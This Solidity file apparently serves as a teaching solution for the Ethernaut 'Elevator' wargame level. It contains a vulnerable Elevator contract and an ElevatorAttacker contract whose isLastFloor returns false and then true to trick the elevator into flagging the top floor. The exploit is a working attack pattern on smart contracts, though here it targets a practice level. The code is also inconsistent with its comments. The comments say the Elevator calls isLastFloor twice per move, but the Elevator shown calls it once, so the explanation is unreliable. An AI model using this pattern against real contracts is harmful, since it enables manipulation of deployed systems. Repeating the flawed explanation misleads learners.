// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title Building
 * @dev Interface that the elevator calls
 */
interface Building {
    function isLastFloor(uint256) external returns (bool);
}

/**
 * @title Elevator
 * @dev Ethernaut Level 11
 * 
 * VULNERABILITY:
 * The elevator calls an EXTERNAL contract to check if it's the last floor.
 * If the external contract returns different values on each call,
 * the elevator can be tricked into thinking it's not the last floor
 * even when it IS the last floor.
 * 
 * The issue: isLastFloor() is called TWICE with the same input,
 * but the external contract returns different values each time.
 * 
 * LESSON:
 * Never trust external contracts for critical logic
 * External calls can return arbitrary data
 */
contract Elevator {
    bool public top;
    uint256 public floor;
    
    function goTo(uint256 _floor) external {
        Building building = Building(msg.sender);
        
        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = false;
        } else {
            // Reached the top!
            top = true;
        }
    }
}

/**
 * @title ElevatorAttacker
 * @dev Exploit: return different values on each call
 */
contract ElevatorAttacker {
    Elevator public elevator;
    uint256 public callCount;
    
    constructor(address _elevator) {
        elevator = Elevator(_elevator);
    }
    
    function attack(uint256 _floor) external {
        // First call: isLastFloor returns false → top = false
        elevator.goTo(_floor);
        // Second call: isLastFloor returns true → top = true!
        elevator.goTo(_floor);
    }
    
    // This is called by the elevator
    // First call: return false (not last floor)
    // Second call: return true (last floor!)
    function isLastFloor(uint256) external returns (bool) {
        callCount++;
        if (callCount == 1) {
            return false;  // First call: "not last floor"
        } else {
            return true;   // Second call: "last floor!"
        }
    }
}
